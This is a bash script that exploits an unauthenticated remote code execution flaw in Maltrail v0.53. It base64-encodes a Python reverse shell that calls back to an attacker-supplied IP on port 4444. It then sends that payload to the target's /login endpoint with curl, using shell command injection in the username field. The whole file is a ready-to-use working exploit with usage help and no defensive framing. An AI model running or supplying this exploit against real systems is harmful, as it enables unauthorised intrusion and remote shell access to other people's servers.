#!/bin/bash


#    ███████████   █████  █████ ███████████  █████    ███████       █████     ████████ 
#   ░░███░░░░░███ ░░███  ░░███ ░░███░░░░░███░░███   ███░░░░░███   ███░░░███  ███░░░░███
#    ░███    ░███  ░███   ░███  ░███    ░███ ░███  ███     ░░███ ███   ░░███░░░    ░███
#    ░██████████   ░███   ░███  ░██████████  ░███ ░███      ░███░███    ░███   ███████ 
#    ░███░░░░░███  ░███   ░███  ░███░░░░░███ ░███ ░███      ░███░███    ░███  ███░░░░  
#    ░███    ░███  ░███   ░███  ░███    ░███ ░███ ░░███     ███ ░░███   ███  ███      █
#    █████   █████ ░░████████   ███████████  █████ ░░░███████░   ░░░█████░  ░██████████
#   ░░░░░   ░░░░░   ░░░░░░░░   ░░░░░░░░░░░  ░░░░░    ░░░░░░░       ░░░░░░   ░░░░░░░░░░ 

                                                                                  
#   COLOURS

redColour="\e[0;31m\033[1m"
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
yellowColour="\e[0;33m\033[1m"
blueColour="\e[0;34m\033[1m"
purpleColour="\e[0;35m\033[1m"
grayColour="\e[0;37m\033[1m"
turquoiseColour="\e[0;36m\033[1m"

#   HELP
function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Use: ./mail.sh -t <TARGET_IP> -i <LISTENING_IP>${endColour}"
	echo -e "\n\n${purpleColour}${endColour}${yellowColour}Maltrail v0.53 — Unauthenticated Remote Code Execution (RCE).${endColour}"
	echo -e "\n${purpleColour}ARGUMENTS:${endColour}"
    echo -e "\n\t${redColour}TARGET_IP       Ip of the target server (eg. http://192.168.1.66:80/ )${endColour}"
	echo -e "\n\t${redColour}LISTENING_IP    Ip of the interface on which you will receive the reverse shell on port 4444 (eg. 192.168.1.60 )${endColour}"
	exit 0
}

function startAttack(){
	echo -e "${yellowColour}[*] Start listen from ip ${turquoiseColour}${listening_ip}${endColour}${yellowColour} on port ${endColour}${turquoiseColour}4444${endColour}"
	sleep 3
	if [ "${target_ip: -1}" != "/" ]; then
        target_ip="$target_ip/";
    fi;
	encoded_payload=$(echo " python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${listening_ip}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' " | base64 | tr -d \\n)
	curl "${target_ip}login" --data 'username=;`echo+\"'${encoded_payload}'\"+|+base64+-d+|+sh`'
}

#   MAIN EXPLOIT
declare -i parameter_counter=0; while getopts ":t:i:h:" arg; do
		case $arg in
			t) target_ip=$OPTARG; let parameter_counter+=1 ;;
   			i) listening_ip=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
done
if [ $parameter_counter -ne 2 ]; then
	helpPanel
else
	startAttack
fi
